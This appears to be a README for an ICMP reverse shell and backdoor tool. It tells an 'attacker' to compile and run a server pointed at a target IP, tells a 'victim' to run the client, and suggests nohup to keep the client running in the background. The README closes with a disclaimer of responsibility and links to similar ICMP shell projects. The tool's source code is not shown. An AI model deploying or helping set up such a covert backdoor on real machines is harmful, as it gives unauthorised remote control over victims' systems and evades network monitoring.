# icmp_reverse_shell

# ICMP REVERSE SHELL / BACKDOOR

Hi, hope you are doing well, this project is about reverse shell using icmp, here is how it can be used

# Usage

FIrstly, compile it in your machine


Attacker:
```bash
gcc server.c -o server -pthread
```

Victim:
```bash
gcc client.c -o client -pthread
```

#### To Run the Server:

```bash
./server <target-ip>
./server 192.168.1.9
```

#### Run the client on victim machine

```bash
./client
```

You can use nohup to put the process in background

```bash
nohup ./client &
```

### Note I'm not responsible for any of your actions,
Be happy.



## References

[ICMPSH](https://github.com/bdamele/icmpsh)

[ICMPSHELL](https://github.com/sin5678/icmp_shell)

[ICMPDOOR](https://github.com/krabelize/icmpdoor)
